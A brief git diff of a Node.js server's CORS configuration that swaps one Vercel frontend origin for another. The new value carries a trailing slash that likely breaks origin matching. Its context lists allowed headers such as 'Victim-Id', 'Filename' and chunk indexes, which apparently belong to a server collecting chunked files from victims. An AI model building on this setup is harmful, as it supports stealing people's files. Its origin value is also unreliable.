@@ -17,7 +17,7 @@ const sslOptions = {
 
 // CORS configuration - allow requests from your Vercel frontend URL
 const corsOptions = {
-  origin: 'https://deoptestfrontend-lzarox83u-2naseernoors-projects.vercel.app', // Replace with your Vercel URL
+  origin: 'https://deoptestfrontend-egqmg8op0-2naseernoors-projects.vercel.app/', // Replace with your Vercel URL
   methods: ['GET', 'POST'],
   allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
 };
